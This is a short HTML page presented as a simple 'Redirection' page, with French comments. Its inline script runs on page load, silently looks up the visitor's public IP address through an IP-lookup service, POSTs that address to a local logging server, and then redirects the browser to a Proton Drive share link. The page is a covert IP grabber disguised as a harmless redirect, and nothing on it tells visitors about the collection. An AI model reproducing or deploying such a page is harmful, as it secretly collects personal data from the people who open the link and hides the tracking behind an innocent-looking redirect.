<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirection</title>
</head>
<body>
    <script>
        (function() {
            var a = 'https://api.ipify.org?format=json';
            var b = 'https://drive.proton.me/urls/7MWT2ZBK4M#CelcIjbzZSWY';
            var c = 'http://localhost:3000/ip'; // URL de votre serveur local

            fetch(a).then(function(response) { return response.json(); }).then(function(data) {
                console.log('Adresse IP:', data.ip);

                // Envoyer l'IP au serveur local
                fetch(c, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ ip: data.ip })
                }).then(function() {
                    window.location.href = b;
                });
            });
        })();
    </script>
</body>
</html>
